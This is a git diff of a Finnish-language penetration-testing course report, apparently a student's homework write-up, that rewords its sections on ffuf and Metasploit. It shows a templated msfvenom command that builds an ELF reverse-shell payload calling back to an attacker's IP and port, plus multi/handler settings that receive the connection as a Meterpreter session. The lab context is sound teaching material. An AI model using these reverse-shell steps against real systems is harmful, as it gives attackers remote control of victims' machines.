@@ -231,7 +231,8 @@ Tässä Ffuf etsii tiedostoja, joiden tiedostopääte on `log.`, eli metodi etsi
 
 ## msfvenom
 
-Tämä tehtävä oli mielenkiintoinen ja keskittyy haavoittuvuuksien hyödyntämiseen käyttäen Metasploitin msfvenom -työkalua. Komennon esimerkki: `msfvenom -p <payload> LHOST=<hyökkääjän IP> LPORT=<kuuntelijan portti> -f elf -o shell.elf`
+Tämä tehtävä oli mielenkiintoinen ja keskittyy haavoittuvuuksien hyödyntämiseen käyttäen Metasploitin msfvenom -työkalua. Komennon esimerkki: 
+`msfvenom -p <payload> LHOST=<hyökkääjän IP> LPORT=<kuuntelijan portti> -f elf -o shell.elf`
 
 ![c3101979ba823ee8859508a627960518](https://github.com/Vanam0/tunkeutumistestaus/assets/122449444/e43c2fe9-316f-4f50-87ac-a8a02c3206a7)
 
@@ -239,17 +240,22 @@ Tämä tehtävä oli mielenkiintoinen ja keskittyy haavoittuvuuksien hyödyntäm
   
 ![afd546e8ca57ea716843c3ad298d8f7a](https://github.com/Vanam0/tunkeutumistestaus/assets/122449444/378deced-238b-4634-a4a9-3e1a613b0b52)
 
-- `.elf`(Executable and Linkable Format) formaatin tiedostolle suoritusoikeudet ja katsotaan keitä olemme :3
+- `.elf`(Executable and Linkable Format) formaatin tiedostolle suoritusoikeudet ja katsotaan keitä olemme. :3
 
 ![kuva](https://github.com/Vanam0/tunkeutumistestaus/assets/122449444/c92e7a0d-ba77-42f5-8857-b4f7cc08eb5a)
 
 
-multi/handeler asetus kuuntelee haittaohjelmaa näillä komennoilla:
+multi/handeler asetukset kuuntelee haittaohjelman lähettämiä yhteyksiä näillä komennoilla:
 
-`set payload`: linux/x64/... (Keskeinen osa hyökkäystä)
-`set LHOST`: hyökkääjän IP-osoite
-`set LPORT`: kuuntelijan portti
-`exploit -j`: käynnistää hyökkäyksen
+`set payload`: Payloadin määrittäminen on keskeinen osa hyökkäystä. Se avataan Meterpreter-istuntona.
+
+`set LHOST`: Täällä määritellään hyökkääjän IP-osoite.
+
+`set LPORT`: Kuuntelijan portti, hyökkäyksen kohteena oleva odottaa yhteyksiä.
+
+`set ExitOnSession false`: Metasploit ei sulje itseään automaattisesti istuntojen luomisen jälkeen.
+
+`exploit -j`: käynnistää hyökkäyksen hiljaisesti.
 
 <details>
 
@@ -280,6 +286,8 @@ https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/
 https://terokarvinen.com/2023/crack-file-password-with-john/
 
 https://youtu.be/tRag-0TPjvA?si=kL1fNbkZ4T4TtGB-  (Setting Payloads in Metasploit - ALS Cyber)
+
+https://www.offsec.com/metasploit-unleashed/meterpreter-basics/
 
 
 
